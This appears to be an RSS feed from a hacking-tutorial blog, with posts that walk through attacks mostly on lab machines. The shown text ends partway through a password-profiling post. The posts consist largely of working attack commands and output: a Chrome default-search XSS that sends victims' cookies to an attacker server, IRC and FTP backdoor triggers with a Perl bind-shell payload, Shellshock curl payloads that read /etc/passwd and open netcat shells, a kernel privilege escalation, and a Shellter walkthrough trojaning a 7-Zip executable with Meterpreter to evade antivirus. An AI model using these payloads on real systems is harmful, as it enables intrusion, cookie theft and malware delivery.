<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
<channel><title>m3t4lk3y</title><link>https://metalkey.net/index.html</link>
<description>Hacking tutorials + info</description><language>en</language>
<lastBuildDate>Sat, 02 Jul 2016 20:37:38 +1000</lastBuildDate>
<pubDate>Sat, 02 Jul 2016 20:37:38 +1000</pubDate>
<atom:link href="https://metalkey.net/feed.rss" rel="self" type="application/rss+xml" />
<item><title>
Google Chrome Search Poison – Default Search Engine Exploit
</title><description><![CDATA[

<h2>Introduction</h2>

<p>In December 2015, I discovered a vulnerability in Google Chrome's default search engines feature whereby a lack of input sanitation allows an attacker to store XSS in the victim's browser. This stored XSS is then executed whenever the victim searches using the omnibox.<br>
In this walkthrough we'll set up a Python SimpleHTTPServer and intercept the victim’s Cookies and search keywords.<br>
<br>
Note: The vulnerability has been reported to the Chromium team but they will not fix the issue.</p>

<h2>Video Demo</h2>

<div align="center">
<a href="https://www.youtube.com/watch?v=WoF-LkA6fMk">
<img src="search-poison.jpg" />
</a> 
</div>

<p>The video demonstration involves manipulation of the chrome master-preferences file to infect the user with the malicious search engine. The user is then directed to the attackers apache server, which extracts the search query, cookies and other system information and seamlessly directs them back to their search.<br></p>

<h2>Walkthrough - Setting up the Listener in Kali</h2>

<p><code></p>

<div class="code">
root@kali:~$ <com>python -m SimpleHTTPServer 80</com>
</div>

<p></code></p>

<h2>Setup on Victim Machine</h2>

<ol>
<li>Go into <strong>"Settings"</strong> in Google Chrome<br></li>
<li>Click on <strong>"Manage Search Engines"</strong><br></li>
<li>Enter your malicious JS and click <strong>"Make Default"</strong><br></li>
</ol>

<h2>Example</h2>

<p><code></p>

<div class="code">
<com>javascript:window.location='http://192.168.1.182/%s'+escape(document.cookie);</com>
</div>

<p></code>
Note: 192.168.1.182 is our SimpleHTTPServer.<br>
Now whenever the victim searches using Google Chrome’s Omnibox, the malicious JS will trigger, forwarding you their cookie and search string (%s).<br></p>

<h2>Other examples</h2>

<p><code></p>

<div class="code">
javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.cookie);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.baseURI);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.domain);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.URL);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(location.host);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.appCodeName);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.appName);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.appVersion);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.platform);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.userAgent);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.platform);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.product);
</div>

<p></code></p>

<p>Tags: <a href='tag_search-poison.html'>search-poison</a></p>
<!-- text end -->
]]></description><link>https://metalkey.net/google-chrome-search-poison---default-search-engine-exploit.html</link>
<guid>https://metalkey.net/./google-chrome-search-poison---default-search-engine-exploit.html</guid>
<dc:creator>metalkey</dc:creator>
<pubDate>Sat, 02 Jul 2016 20:37:36 +1000</pubDate></item>
<item><title>
UnrealIRCD 3.2.8.1 Backdoor Command Execution
</title><description><![CDATA[
<strong>Attacker:</strong> Kali Linux<br>
<strong>Victim:</strong> Metasploitable 2<br>
<br>
Unreal IRCD 3.2.8.1 contains a backdoor that is triggered by entering <strong>AB;</strong> upon connecting. The backdoor was present in the Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th 2010.<br>
<br>
The following example demonstrates it’s use on Metasploitable 2 (192.168.1.142).<br></p>

<h2>Generating the Payload</h2>

<p>We’re going to generate a unix bind shell with msfvenom (port 4444) and connect to this with Netcat.
<code></p>

<div class="code">
root@kali:~$ <com>msfvenom -p cmd/unix/bind_perl --payload-options</com><br>
root@kali:~$ <com>msfvenom -p cmd/unix/bind_perl LHOST=192.168.1.142</com><br>
No platform was selected, choosing Msf::Module::Platform::Unix from the payload<br>
No Arch selected, selecting Arch: cmd from the payload<br>
No encoder or badchars specified, outputting raw payload<br>
Payload size: 240 bytes<br>
<b>perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(){if($_=~ /(.*)/){system $1;}};'</b><br>
</div>

<p></code></p>

<h2>Triggering the Exploit</h2>

<p><code></p>

<div class="code">
root@kali:~$ <com>nc -vn 192.168.1.142 6667</com><br>
(UNKNOWN) [192.168.1.142] 6667 (ircd) open<br>
:irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...<br>
:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead<br>
<com>AB;perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(){if($_=~ /(.*)/){system $1;}};'</com><br>
:irc.Metasploitable.LAN 451 AB;perl :You have not registered
</div>

<p></code></p>

<h2>Connecting to the Netcat Bind Shell</h2>

<p><code></p>

<div class="code">
root@kali:~$ <com>nc -vn 192.168.1.142 4444</com><br>
(UNKNOWN) [192.168.1.142] 4444 (?) open<br>
<com>python -c "import pty;pty.spawn('/bin/bash')"</com><br>
root@metasploitable:/etc/unreal#
</div>

<p></code></p>

<p>Tags: <a href='tag_backdoors.html'>backdoors</a></p>


<!-- text end -->
]]></description><link>https://metalkey.net/unrealircd-3281-backdoor-command-execution.html</link>
<guid>https://metalkey.net/./unrealircd-3281-backdoor-command-execution.html</guid>
<dc:creator>metalkey</dc:creator>
<pubDate>Sat, 02 Jul 2016 19:11:59 +1000</pubDate></item>
<item><title>
VSFTPD v2.3.4 Backdoor Command Execution
</title><description><![CDATA[
<strong>Attacker:</strong> Kali Linux<br>
<strong>Victim:</strong> Windows 10<br>
<br>
VSFTPD v2.3.4 contains a backdoor that is triggered by entering <strong>anystring:)</strong> as the username (no password required). After the backdoor is triggered, the target machine opens a shell on port 6200.<br>
<br>
This example demonstrates it’s use on Metasploitable 2 (192.168.1.142).</p>

<h2>Triggering the Backdoor</h2>

<p><code></p>

<div class="code">
root@kali:~$ <com>ftp 192.168.1.142</com><br>
Connected to 192.168.1.142.<br>
220 (vsFTPd 2.3.4)<br>
Name (192.168.1.142:root):<com>123456:)</com><br>
331 Please specify the password.<br>
Password: [Enter]<br>
[CTRL+C]<br>
421 Service not available, remote server has closed connection
</div>

<p></code></p>

<h2>Connecting to the Shell</h2>

<p><code></p>

<div class="code">
root@kali:~$ <com>nc -vn 192.168.1.142 6200</com><br>
(UNKNOWN) [192.168.1.142] 6200 (?) open<br>
<com>python -c "import pty;pty.spawn('/bin/bash')"</com><br>
root@metasploitable:/#
</div>

<p></code></p>

<p>Tags: <a href='tag_backdoors.html'>backdoors</a></p>


<!-- text end -->
]]></description><link>https://metalkey.net/vsftpd-v234-backdoor-command-execution.html</link>
<guid>https://metalkey.net/./vsftpd-v234-backdoor-command-execution.html</guid>
<dc:creator>metalkey</dc:creator>
<pubDate>Sat, 02 Jul 2016 19:05:03 +1000</pubDate></item>
<item><title>
Linux Kernel 2.6 UDEV &lt; 141 – Local Privilege Escalation Exploit Example
</title><description><![CDATA[
<strong>Attacker:</strong> Kali Linux<br>
<strong>Victim:</strong> Metasploitable 2<br>
<br>
Note: This exploit leverages a vulnerability in NETLINK.<br>
More information on NETLINK can be found on the Linux Foundation website (<a href="http://www.linuxfoundation.org/collaborate/workgroups/networking/generic_netlink_howto">http://www.linuxfoundation.org/collaborate/workgroups/networking/generic_netlink_howto</a>).</p>

<h2>Download the Exploit from ExploitDB</h2>

<p>Head over to the Exploit Database and download Jon Oberheide’s udev exploit for Linux Kernel 2.6 (<a href="https://www.exploit-db.com/exploits/8572/">https://www.exploit-db.com/exploits/8572/</a>).</p>

<h2>Telnet to Metasploitable 2, then Upload and Compile the Exploit</h2>

<p>Telnet to Metasploitable 2 then start a netcat listener.<br>
In Kali, We’re going to tar the exploit and pipe the output to netcat.<br>
In Metasploitable 2, we’re going to receive and untar the exploit, then compile it with gcc.
<code></p>

<div class="code">
root@kali:~$ <com>telnet 192.168.1.10</com><br>
Trying 192.168.1.10...<br>
Connected to 192.168.1.10.<br>
<br>
Contact: msfdev[at]metasploit.com<br>
Login with msfadmin/msfadmin to get started<br>
metasploitable login: <com>msfadmin</com><br>
Password: <com>msfadmin</com><br>
Linux metasploitable 2.6.24-16-server #1 SMP i686<br>
<br>
msfadmin@metasploitable:~$ <com>nc -lvp 12345 | tar -xf -</com><br>
listening on [any] 12345 ...
</div>

<p></code>
Open a new tab, tar the exploit and pipe the output to netcat
<code></p>

<div class="code">
root@kali:~$ <com>tar -cf - 8572.c | nc -vn 192.168.1.10 12345</com><br>
(UNKNOWN) [192.168.1.10] 12345 (?) open
</div>

<p></code>
Back in the first tab we can see our Kali Machine connect.<br>
Allow a few seconds for the file transfer to complete then CTRL+C to end the session.<br>
Check the exploit has been received, then compile with gcc.<br>
<code></p>

<div class="code">
connect to [192.168.1.10] from kali [192.168.1.182] 48411<br>
msfadmin@metasploitable:~$ <com>ls -lah 8572.c</com><br>
-rw-r--r-- 1 msfadmin msfadmin 2.9K 2015-11-05 04:14 8572.c<br>
msfadmin@metasploitable:~$ <com>gcc 8572.c -o 8572</com>
</div>

<p></code></p>

<h2>Executing the Exploit</h2>

<p>Now we just need to get the PID of the the udevd netlink socket on Metasploitable 2, create our run script (bind an instance of bash to a netcat listener) and execute the exploit
<code></p>

<div class="code">
msfadmin@metasploitable:~$ <com>cat /proc/net/netlink</com><br>
df552800 15 2738 00000001 0 0 00000000 2<br>
msfadmin@metasploitable:~$ <com>cd /tmp</com><br>
msfadmin@metasploitable:/tmp$ <com>nano run</com><br>
<com>#!/bin/bash</com><br>
<com>nc -lvvp 2345 -e /bin/bash</com><br>
msfadmin@metasploitable:/tmp$ <com>cd</com><br>
msfadmin@metasploitable:~$ <com>./8572 2738</com><br>
</div>

<p></code>
Open a new tab and connect to the bind shell
<code></p>

<div class="code">
root@kali:~$ <com>nc -vn 192.168.1.10 2345</com><br>
(UNKNOWN) [192.168.1.10] 2345 (?) open<br>
<com>python -c "import pty;pty.spawn('/bin/bash')"</com><br>
root@metasploitable:/# <com>whoami</com><br>
root
</div>

<p></code></p>

<p>Tags: <a href='tag_privilege-escalation.html'>privilege-escalation</a></p>


<!-- text end -->
]]></description><link>https://metalkey.net/linux-kernel-26-udev-lt-141---local-privilege-escalation-exploit-example.html</link>
<guid>https://metalkey.net/./linux-kernel-26-udev-lt-141---local-privilege-escalation-exploit-example.html</guid>
<dc:creator>metalkey</dc:creator>
<pubDate>Sat, 02 Jul 2016 18:52:36 +1000</pubDate></item>
<item><title>
Shellshock Explained + Exploitation Tutorial
</title><description><![CDATA[

<h2>Introduction</h2>

<p>Shellshock is a “code injection attack” that takes advantage of a function definition vulnerability in Bash 4.3 and earlier.<br>
The vulnerability is caused by Bash processing trailing strings after function definitions in the values of environment variables. In Bash 4.3 and later, these trailing strings will not be executed.</p>

<h2>Testing</h2>

<p>To test if your system is vulnerable, simply run the command below in a Bash shell.
<code></p>

<div class="code">
user@debian8:~$ <com>env x='() { :;}; echo vulnerable' bash -c "echo not-vulnerable"</com>
</div>

<p></code>
If 'vulnerable' is echoed back, your system is vulnerable, since echo vulnerable is directly after the function definition env x='() { :;};<br>
A response of 'not-vulnerable' indicates your system is not vulnerable to the test above.<br>
Note: Additional tests should be performed to confirm your system is not vulnerable to Shellshock.<br>
These tests can be found on the Shellshocker Website - <a href="https://shellshocker.net/">https://shellshocker.net/</a></p>

<h2>Exploitation</h2>

<p>Launch the 'Pentester Lab: CVE-2014-6271 Shellshock' VM (<a href="https://pentesterlab.com/exercises/cve-2014-6271">https://pentesterlab.com/exercises/cve-2014-6271</a>) then browse to the VM’s IP in your web-browser.<br>
You will be presented with the output of the [uptime] and [uname -a] Linux commands, running on the Pentesterlab VM.</p>

<blockquote>
  <p>CVE-2014-6271<br>
This system is running:<br>
uptime: 20:44:15 up 0 min, 1 users, load average: 0.06, 0.01, 0.00<br>
kernel: Linux vulnerable 3.14.1-pentesterlab #1 SMP Sun Jul 6 09:16:00 EST 2014 i686 GNU/Linux<br></p>
</blockquote>

<p>View the page source and you’ll notice the location of the CGI (<a href="http://www.techrepublic.com/article/cgi-crash-course-how-to-run-cgi-scripts/">http://www.techrepublic.com/article/cgi-crash-course-how-to-run-cgi-scripts/</a>) script that is executed on the server.</p>

<blockquote>
  <p>$.getJSON("/cgi-bin/status", function (data) {<br></p>
</blockquote>

<p>Let’s use curl to launch a few shellshock attacks against the status CGI script via the User-Agent string (-A in curl).</p>

<h2>Passwd File</h2>

<p><code></p>

<div class="code">
user@debian8:~$ <com>curl -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/cat /etc/passwd' http://192.168.1.14/cgi-bin/status > passwd</com><br>
<br>
user@debian8:~$ <com>cat passwd</com><br>
root:x:0:0:root:/root:/bin/sh<br>
lp:x:7:7:lp:/var/spool/lpd:/bin/sh<br>
nobody:x:65534:65534:nobody:/nonexistent:/bin/false<br>
tc:x:1001:50:Linux User,,,:/home/tc:/bin/sh<br>
pentesterlab:x:1000:50:Linux User,,,:/home/pentesterlab:/bin/sh 
</div>

<p></code></p>

<h2>Directory Listing</h2>

<p><code></p>

<div class="code">
user@debian8:~$ <com>curl -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/ls /' http://192.168.1.14/cgi-bin/status</com><br>
bin<br>
boot<br>
dev<br>
etc<br>
home<br>
init<br>
...
</div>

<p></code></p>

<h2>Bind Shell</h2>

<p>Bind an instance of Bash to a netcat listener on port 2345 and connect.<br>
After executing the bind shell on the Shellshock VM (/usr/bin/nc -lvvp 2345 -e /bin/bash) you will need to open a new terminal window to connect using (nc -vn 192.168.1.14 2345)
<code></p>

<div class="code">
user@debian8:~$ <com>curl -A '() { :; }; /bin/bash -c "/usr/bin/nc -lvvp 2345 -e /bin/bash"' http://192.168.1.14/cgi-bin/status</com><br>
<br>
user@debian8:~$ <com>nc -vn 192.168.1.14 2345</com><br>
(UNKNOWN) [192.168.1.14] 2345 (?) open<br>
<br>
<com>whoami</com><br>
<com>pentesterlab</com><br>
<br>
<com>/sbin/ifconfig</com><br>
[eth0]<br>
Link encap:Ethernet HWaddr 08:00:27:84:1F:23<br>
inet addr:192.168.1.14 Bcast:192.168.1.255 Mask:255.255.255.0<br>
inet6 addr: fe80::a00:27ff:fe84:1f23/64 Scope:Link<br>
UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1<br>
RX packets:742 errors:0 dropped:0 overruns:0 frame:0<br>
TX packets:426 errors:0 dropped:0 overruns:0 carrier:0<br>
collisions:0 txqueuelen:1000<br>
RX bytes:57418 (56.0 KiB) TX bytes:246492 (240.7 KiB)<br>
Interrupt:10 Base address:0xd020
</div>

<p></code></p>

<h2>Conclusion</h2>

<p>The examples above demonstrate a tiny fraction of what is possible using the Shellshock vulnerability.<br>
<br>
Additional attack vectors include:<br>
– OpenSSH server<br>
– DHCP clients<br>
– Qmail server<br>
– IBM HMC restricted shell<br>
<br>
If your system is vulnerable, ensure it is patched immediately by upgrading your version of Bash then re-testing.</p>

<p>Tags: <a href='tag_shellshock.html'>shellshock</a></p>


<!-- text end -->
]]></description><link>https://metalkey.net/shellshock-explained--exploitation-tutorial.html</link>
<guid>https://metalkey.net/./shellshock-explained--exploitation-tutorial.html</guid>
<dc:creator>metalkey</dc:creator>
<pubDate>Sat, 02 Jul 2016 18:01:02 +1000</pubDate></item>
<item><title>
Shellter – The ultimate tool for AV evasion
</title><description><![CDATA[

<p>Shellter Website - <a href="https://www.shellterproject.com/">https://www.shellterproject.com/</a><br>
<br>
<strong>Attacker:</strong> Kali Linux<br>
<strong>Victim:</strong> Windows 10 (fully patched, fully updated antivirus)</p>

<h2>Introduction</h2>

<p>Shellter is a tool for injecting dynamic shellcode into win32 exe’s. The shellcode can be yours, or something you generate via a 3rd party framework such as Metasploit.<br>
Shellter preserves the original structure of the target executable and can be used in either Automatic or Manual mode. It can also be used to create encoded/self-decrypting payloads.<br>
<br>
In this tutorial, we will cover the automatic mode of operation.<br></p>

<h2>Installation</h2>

<p>You can either download and install Shellter from the Shellter Website or install using apt-get in Kali:
<code></p>

<div class="code">
root@kali:~$ <com>apt-get update && apt-get install shellter</com>
</div>

<p></code></p>

<h2>Payload Creation</h2>

<p>Start shellter and select [A] for automatic mode, then select your target .exe file.
<code></p>

<div class="code">
root@kali:~$ <com>shellter</com><br>
Choose Operation Mode - Auto/Manual (A/M/H): <com>A</com><br>
PE Target: <com>/root/Downloads/7-ZipPortable.exe</com>
</div>

<p></code>
On the payload menu, select [L] then [1] for Meterpreter<em>Reverse</em>TCP.<br>
Enter your IP address and port you wish to use the payload on.<br>
Note: If you select Stealth Mode, you must set [exitfunc] to [thread] in Metasploit.
<code></p>

<div class="code">
************<br>
* Payloads *<br>
************<br>
<br>
[1] Meterpreter_Reverse_TCP<br>
[2] Meterpreter_Reverse_HTTP<br>
[3] Meterpreter_Reverse_HTTPS<br>
[4] Meterpreter_Bind_TCP<br>
[5] Shell_Reverse_TCP<br>
[6] Shell_Bind_TCP<br>
[7] WinExec<br>
<br>
Use a listed payload or custom? (L/C/H): <com>L</com><br>
Select payload by index: <com>1</com><br>
SET LHOST: <com>192.168.1.162</com><br>
SET LPORT: <com>4321</com>
</div>

<p></code>
Shellter will now encode and obfuscate the payload.<br>
When the process is complete, hit [Enter] to exit.<br>
<br>
At this point you can either use the checkvt script from Veil Evasion (<a href="https://www.veil-framework.com/how-to-safely-check-veil-payloads-against-virustotal/">https://www.veil-framework.com/how-to-safely-check-veil-payloads-against-virustotal/</a>) or Mubix’s vt-notify script (<a href="https://github.com/mubix/vt-notify">https://github.com/mubix/vt-notify</a>) to safely check the payload against Virus Total. Alternatively, use the virus scanner of your target system to confirm the payload is undetectable. DO NOT upload your exe to Virus Total.</p>

<h2>Exploitation</h2>

<p><code></p>

<div class="code">
root@kali:~$ <com>msfconsole</com><br>
msf > <com>use exploit/multi/handler</com><br>
msf exploit(handler) > <com>set payload windows/meterpreter/reverse_tcp</com><br>
msf exploit(handler) > <com>set lhost 192.168.1.162</com><br>
msf exploit(handler) > <com>set lport 4321</com><br>
msf exploit(handler) > <com>exploit</com>
</div>

<p></code>
Run the payload on your Victim machine
<code></p>

<div class="code">
C:\7-ZipPortable><com>7-ZipPortable.exe</com>
</div>

<p></code>
Back in Kali, a Meterpreter session will open and you now have a reverse shell to your victim Windows 10 machine.
<code></p>

<div class="code">
[*] Meterpreter session 1 opened (192.168.1.162:4321 -> 192.168.1.11:49627) at 2015-10-05 00:39:33 +1100<br>
<br>
meterpreter > <com>shell</com><br>
Process 3788 created.<br>
Channel 1 created.<br>
Microsoft Windows [Version 10.0.10240]<br>
(c) 2015 Microsoft Corporation. All rights reserved.<br>
<br>
C:\7-ZipPortable> 
</div>

<p></code></p>

<p>Tags: <a href='tag_av-evasion.html'>av-evasion</a></p>


<!-- text end -->
]]></description><link>https://metalkey.net/shellter---the-ultimate-tool-for-av-evasion.html</link>
<guid>https://metalkey.net/./shellter---the-ultimate-tool-for-av-evasion.html</guid>
<dc:creator>metalkey</dc:creator>
<pubDate>Fri, 01 Jul 2016 15:27:49 +1000</pubDate></item>
<item><title>
Increasing the Power Output of your Alfa AWUS036H
</title><description><![CDATA[
Warning: Check the laws in your region before adjusting the power output of your wifi adapter. Increasing the power above 20dBm can be a breach of regulations in some countries.</p>

<p><strong>OS:</strong> Kali Linux</p>

<h2>Checking the Current Power Output</h2>

<p>In the example below Tx-Power is set to the default value of 20dBm for the current locale.<br>
Information on how this value is determined is explained in-depth at Linux Wireless (<a href="http://linuxwireless.org/en/developers/Regulatory/">http://linuxwireless.org/en/developers/Regulatory/</a>)<br>
<code></p>

<div class="code">
root@kali:~$ <com>iwconfig</com><br>
<br>
wlan0 IEEE 802.11bg ESSID:off/any<br>
Mode:Managed Access Point: Not-Associated <com>Tx-Power=20 dBm</com><br>
Retry short limit:7 RTS thr:off Fragment thr:off<br>
Encryption key:off<br>
Power Management:off<br>

</div>

<p></code></p>

<h2>Increasing the Output to 1-Watt (30dBm)</h2>

<p>To increase the power output of the Alfa AWUS036H to 1-Watt (manufacturer specified maximum) you will need to change your locale to a region with different regulations (e.g. Belize – BZ) and set txpower manually.
<code></p>

<div class="code">
root@kali:~$ <com>ifconfig wlan0 down</com><br>
root@kali:~$ <com>iw reg set BZ</com><br>
root@kali:~$ <com>iwconfig wlan0 txpower 30</com><br>
root@kali:~$ <com>ifconfig wlan0 up</com><br>
root@kali:~$ <com>iwconfig</com><br>
<br>
wlan0 IEEE 802.11bg ESSID:off/any<br>
Mode:Managed Access Point: Not-Associated <com>Tx-Power=30 dBm</com><br>
Retry short limit:7 RTS thr:off Fragment thr:off<br>
Encryption key:off<br>
Power Management:off<br>

</div>

<p></code>
We have successfully set txpower to 30dBM (1-Watt).<br>
Higher values can also be set and detailed instructions are available at Null Byte (<a href="http://null-byte.wonderhowto.com/how-to/set-your-wi-fi-cards-tx-power-higher-than-30-dbm-0149606/">http://null-byte.wonderhowto.com/how-to/set-your-wi-fi-cards-tx-power-higher-than-30-dbm-0149606/</a>).</p>

<p>Tags: <a href='tag_wifi.html'>wifi</a></p>


<!-- text end -->
]]></description><link>https://metalkey.net/increasing-the-power-output-of-your-alfa-awus036h.html</link>
<guid>https://metalkey.net/./increasing-the-power-output-of-your-alfa-awus036h.html</guid>
<dc:creator>metalkey</dc:creator>
<pubDate>Fri, 01 Jul 2016 15:11:09 +1000</pubDate></item>
<item><title>
Metasploit Browser Autopwn – Windows XP SP2
</title><description><![CDATA[
<strong>Attacker:</strong> Kali Linux<br>
<strong>Victim:</strong> Windows XP SP3 (Java 6u25, IE6)<br></p>

<h2>Step 1 – Starting the Browser Autopwn Server</h2>

<p>Run msfconsole, load the browser_autopwn module and set all required options.<br>
<code></p>

<div class="code">
root@kali:~$ <com>msfconsole</com><br>
msf > <com>use auxiliary/server/browser_autopwn</com><br>
msf auxiliary(browser_autopwn) > <com>set LHOST 192.168.1.12</com><br>
msf auxiliary(browser_autopwn) > <com>set SRVPORT 80</com><br>
msf auxiliary(browser_autopwn) > <com>set URIPATH /</com><br>
msf auxiliary(browser_autopwn) > <com>run</com><br>
<br>
[*] Starting exploit modules on host 192.168.1.12...<br>
[*] Server started.
</div>

<p></code>
The Browser Autopwn Server is now running and waiting for victims to browse to the url http://192.168.1.12<br></p>

<h2>Step 2 – Pwning the Victim</h2>

<p>On your Windows XP test machine (victim), browse to http://192.168.1.12.<br>
This will trigger the browser_autopwn module to serve the appropriate exploit and launch a meterpreter session.<br>
<code></p>

<div class="code">
[*] Meterpreter session 1 opened (192.168.1.12:7777 -> <br>
192.168.1.13:1045) at 2015-07-25 05:08:06 -0400<br>
...<br>
msf auxiliary(browser_autopwn) ><com> sessions -i 1</com><br>
[*] Starting interaction with 1...meterpreter ><com> shell</com><br>
Microsoft Windows XP [Version 5.1.2600]<br>
(C) Copyright 1985-2001 Microsoft Corp.<br>
C:\Documents and Settings\IEUser\Desktop><com>echo %USERNAME%</com><br>
Victim<br>
<br>
C:\Documents and Settings\IEUser\Desktop><com>ipconfig</com><br>
Windows IP Configuration<br>
<br>
Ethernet adapter Local Area Connection:<br>
<br>
Connection-specific DNS Suffix . : Home<br>
IP Address. . . . . . . . . . . . : 192.168.1.13<br>
Subnet Mask . . . . . . . . . . . : 255.255.255.0<br>
Default Gateway . . . . . . . . . : 192.168.1.1<br>
<br>
C:\Documents and Settings\IEUser\Desktop><br>
</div>

<p></code>
You now have shell access to the Windows XP SP3 Victim with the same access as the user who navigated to the exploit url.<br></p>

<h2>Solution</h2>

<p>Keep your software fully updated (e.g. Windows, Web Browsers, Java, etc…) and uninstall unused applications.</p>

<p>Tags: <a href='tag_metasploit.html'>metasploit</a></p>


<!-- text end -->
]]></description><link>https://metalkey.net/metasploit-browser-autopwn---windows-xp-sp2.html</link>
<guid>https://metalkey.net/./metasploit-browser-autopwn---windows-xp-sp2.html</guid>
<dc:creator>metalkey</dc:creator>
<pubDate>Fri, 01 Jul 2016 15:09:53 +1000</pubDate></item>
<item><title>
Metasploit Adobe Flash 18.0.0.203 Exploit – Windows 7 / Windows 8.1
</title><description><![CDATA[
<strong>Attacker:</strong> Kali Linux<br>
<strong>Victim:</strong> Windows 7 Enterprise 32-bit (Adobe Flashplayer 18.0.0.203, Firefox 39)</p>

<h2>Step 1 – Starting the Exploit Server</h2>

<p>Run msfconsole, load adobe-flash-opaque-background-uaf and set all required options.
<code></p>

<div class="code">
root@kali:~$ <com>msfconsole</com><br>
msf > <com>use exploit/multi/browser/adobe_flash_opaque_background_uaf</com><br>
msf exploit(adobe_flash_opaque_background_uaf) > <com>set SRVPORT 80</com><br>
msf exploit(adobe_flash_opaque_background_uaf) > <com>set URIPATH /</com><br>
msf exploit(adobe_flash_opaque_background_uaf) > <com>exploit</com><br>
[*] Local IP: http://192.168.1.12:80/<br>
[*] Server started.<br>
</div>

<p></code></p>

<h2>Step 2 – Exploiting the Victim Machine</h2>

<p>On your Windows test machine (victim), start Firefox and browse to http://192.168.1.12.<br>
This will trigger the adobe-flash-opaque-background-uaf exploit and launch a meterpreter session.<br>
<code></p>

<div class="code">
[*] 192.168.1.11 adobe_flash_opaque_background_uaf - Sending SWF...<br>
[*] Sending stage (885806 bytes) to 192.168.1.11<br>
[*] Meterpreter session 1 opened (192.168.1.12:4444 -> 192.168.1.11:49297) at 2015-08-01 04:39:34 -0400<br>
msf exploit(adobe_flash_opaque_background_uaf) > <com>sessions -i 1</com><br>
[*] Starting interaction with 1...<br>
<br>
meterpreter > <com>getuid</com><br>
Server username: IE8Win7\IEUser<br>
meterpreter > <com>ls</com><br>
Listing: C:\<br>
============<br>
<br>
Mode Size Type Last modified Name<br>
---- ---- ---- ------------- ----<br>
40777/rwxrwxrwx 0 dir 2013-10-23 12:22:56 -0400 $Recycle.Bin<br>
40777/rwxrwxrwx 0 dir 2009-07-14 00:53:55 -0400 Documents and Settings<br>
40777/rwxrwxrwx 0 dir 2009-07-13 22:37:05 -0400 PerfLogs<br>
40555/r-xr-xr-x 0 dir 2015-08-01 03:32:42 -0400 Program Files<br>
40777/rwxrwxrwx 0 dir 2015-08-01 03:32:42 -0400 ProgramData<br>
40777/rwxrwxrwx 0 dir 2013-10-23 12:22:42 -0400 Recovery<br>
40777/rwxrwxrwx 0 dir 2014-11-26 14:57:05 -0500 System Volume Information<br>
40555/r-xr-xr-x 0 dir 2013-10-23 12:22:47 -0400 Users<br>
40777/rwxrwxrwx 0 dir 2013-10-23 17:52:20 -0400 Wallpaper<br>
40777/rwxrwxrwx 0 dir 2015-08-01 03:20:08 -0400 Windows<br>
100777/rwxrwxrwx 24 fil 2009-06-10 17:42:20 -0400 autoexec.bat<br>
100666/rw-rw-rw- 10 fil 2009-06-10 17:42:20 -0400 config.sys<br>
100666/rw-rw-rw- 1073741824 fil 2015-08-01 04:01:24 -0400 pagefile.sys<br>
</div>

<p></code></p>

<h2>Solution</h2>

<p>Uninstall flashplayer.</p>

<p>Tags: <a href='tag_metasploit.html'>metasploit</a></p>


<!-- text end -->
]]></description><link>https://metalkey.net/metasploit-adobe-flash-1800203-exploit---windows-7--windows-81.html</link>
<guid>https://metalkey.net/./metasploit-adobe-flash-1800203-exploit---windows-7--windows-81.html</guid>
<dc:creator>metalkey</dc:creator>
<pubDate>Fri, 01 Jul 2016 15:06:44 +1000</pubDate></item>
<item><title>
Password Profiling &amp; Wordlist Generation with CUPP (Common User Password Profiler)
</title><description><![CDATA[

<p><strong>OS:</strong> Debian 8<br>
<br>
CUPP was created by Muris Kurgas (aka j0rgan) from remote-exploit (<a href="http://remote-exploit.org/">http://remote-exploit.org/</a>) and is an excellent tool for password profiling and wordlist optimization.</p>

<h2>Installation</h2>

<p>To install, simply clone the git repo.
<code></p>

<div class="code">
user@debian8:~$ <com>git clone https://github.com/Mebus/cupp.git</com><br>
user@debian8:~$ <com>./cupp.py</com><br>
<br>
<com>-i</com> Interactive questions for user password profiling<br>
<com>-w</com> Use this option to improve existing dictionary, or WyD.pl output to make some pwnsauce<br>
<com>-l</com> Download huge wordlists from repository<br>
<com>-a</com> Parse default usernames and passwords directly from Alecto DB. Project Alecto uses purified databases of Phenoelit and CIRT which where merged and enhanced.<br>
</div>

<p></code></p>

<h2>Password Profiling</h2>

<p>In this example we will password profile the user "John Smith".<br>
We have some basic information on this user and will fill out the appropriate fields.<br>
<code></p>

<div class="code">
user@debian8:~$ <com>./cupp.py -i</com><br>
<br>
[+] Insert the informations about the victim to make a dictionary<br>
[+] If you don't know all the info, just hit enter when asked! ;)<br>
<br>
> First Name: <com>John</com><br>
> Surname: <com>Smith</com><br>
> Nickname: <com>John</com><br>
> Birthdate (DDMMYYYY): <com>12011955</com><br>
<br>
> Partners) name: <com>Mary</com><br>
> Partners) nickname: <com>Mary</com><br>
> Partners) birthdate (DDMMYYYY): <com>01031955</com><br>
<br>
> Child's name: <com>Mark</com><br>
> Child's nickname: <com>Mark</com><br>
> Child's birthdate (DDMMYYYY): <com>01011982</com><br>
<br>
> Pet's name: <com>Tim</com><br>
